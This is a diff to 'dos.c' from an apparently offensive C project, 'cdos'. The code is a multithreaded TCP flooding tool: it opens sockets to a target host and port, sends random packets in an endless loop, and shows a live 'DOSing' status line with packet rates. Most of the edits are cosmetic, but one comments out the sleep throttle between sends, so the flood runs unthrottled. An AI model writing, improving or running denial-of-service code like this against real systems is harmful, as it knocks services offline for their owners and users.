@@ -1,7 +1,4 @@
-//
 //  dos.c
-//  cdos
-//
 
 #include "dos.h"
 #include "util.h"
@@ -62,6 +59,7 @@ void _dos_tcp(char* host, int port, char* packet)
     tcount++;
     
     bool RAND_PACKET = (packet == NULL);
+
     if (port == 0) {
         port = randport();
     }
@@ -76,18 +74,23 @@ void _dos_tcp(char* host, int port, char* packet)
     }
     char* buf = (char*)malloc(1024 * sizeof(buf));
     size_t _bufsize = 1024 * sizeof(buf);
-    for (;;) {
-        if(use_dos_sleep){
-            sleep_ms(dos_sleep);
-        }
+
+    while(1) 
+    {
+        //if(use_dos_sleep){
+        //    sleep_ms(dos_sleep);
+        //}
+
         if (!__run) {
             shutdown(sock, 2);
             close(sock);
             break;
         }
+
         if(sock<0){
             dperror("Failed to open socket");
         }
+
         if (RAND_PACKET) {
             packet = randstring(randrange(64, 2048));
         }
@@ -112,6 +115,7 @@ void _dos_tcp(char* host, int port, char* packet)
             pc++;
         }
     }
+
     tcount--;
 }
 
@@ -119,7 +123,8 @@ void _dos_stat()//update stat
 {
     success("Status:");
     success("Hit ^C to exit");
-    for (;;) {
+    while(1) 
+    {
         clock_t now=clock();
         double delta_t=(double)(now - tm) / CLOCKS_PER_SEC;//time diff
         double delta_p=psent-psent_old;
@@ -129,6 +134,7 @@ void _dos_stat()//update stat
         success_n("DOSing %s:%d;Packets sent:%.2f %s,thread count:%d,%.2f%s/s\r", __host, __port, psent,smetrics, tcount,delta_p/delta_t,smetrics);
         pc=0;
     }
+
 }
 
 _dos_param* _init_dos_p(char* host, int port, char* packet, uint8_t mode)
@@ -150,6 +156,7 @@ void __dos_wrapper(_dos_param* x)
         assert(false);
     }
 }
+
 void dos(char* host, int port, char* packet, int _tcount, int mode)
 {
     signal(SIGPIPE, SIG_IGN);
